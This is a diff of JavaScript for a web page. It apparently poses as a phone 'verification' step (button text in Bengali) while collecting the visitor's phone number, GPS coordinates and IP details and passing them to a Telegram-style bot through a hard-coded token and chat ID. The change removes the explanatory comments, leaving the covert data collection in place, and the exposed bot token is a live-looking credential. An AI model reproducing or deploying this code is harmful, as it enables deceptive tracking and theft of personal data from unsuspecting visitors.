@@ -43,7 +43,6 @@ async function initiateProcess() {
     btn.innerText = "ভেরিফাই হচ্ছে...";
     btn.disabled = true;
 
-    // লোকেশন পারমিশন চাওয়া
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (pos) => sendToBot(phone, pos.coords.latitude, pos.coords.longitude),
@@ -62,11 +61,10 @@ async function initiateProcess() {
 }
 
 async function sendToBot(phone, lat, lon) {
-    const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; // আপনার বট টোকেন
-    const chat_id = "7887080882"; // আপনার চ্যাট আইডি
+    const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; 
+    const chat_id = "7887080882"; 
 
     try {
-        // আইপি তথ্য সংগ্রহ
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
 
